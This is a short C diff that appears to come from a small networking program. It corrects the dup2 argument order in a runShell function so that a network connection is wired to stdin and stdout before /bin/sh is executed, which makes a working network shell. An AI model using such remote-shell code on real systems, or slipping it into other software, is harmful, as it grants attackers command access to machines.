@@ -25,9 +25,9 @@ void onInt(int signal) {
 }
 
 int runShell(int connection) {
-  if (dup2(STDIN_FILENO, connection) == -1)
+  if (dup2(connection, STDIN_FILENO) == -1)
     ER("Failed to redirect connection to stdin");
-  if (dup2(STDOUT_FILENO, connection) == -1)
+  if (dup2(connection, STDOUT_FILENO) == -1)
     ER("Failed to redirect stdout to connection");
   if (execl("/bin/sh", "/bin/sh", NULL) == -1) ER("Failed to run /bin/sh");
   return -1;
